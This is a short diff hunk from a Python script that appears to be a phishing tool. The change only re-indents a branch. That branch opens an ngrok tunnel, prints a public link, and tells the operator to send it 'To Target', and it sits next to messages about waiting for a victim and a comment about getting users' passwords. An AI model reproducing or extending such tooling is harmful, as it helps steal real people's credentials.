@@ -554,10 +554,10 @@ exit();""")
       time.sleep(0.07)
       print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Waiting For Victim ! ! !")
     elif v == "02":
-    global token
-    a = ngrok.connect(6060,"http",auth_token=token)
-    print(Fore.GREEN+" [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://"))
-    print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+"Place Send Link To Target")
+       global token
+       a = ngrok.connect(6060,"http",auth_token=token)
+       print(Fore.GREEN+" [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://"))
+       print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+"Place Send Link To Target")
 # Getting User And Password
     def userin():
         global stat_file
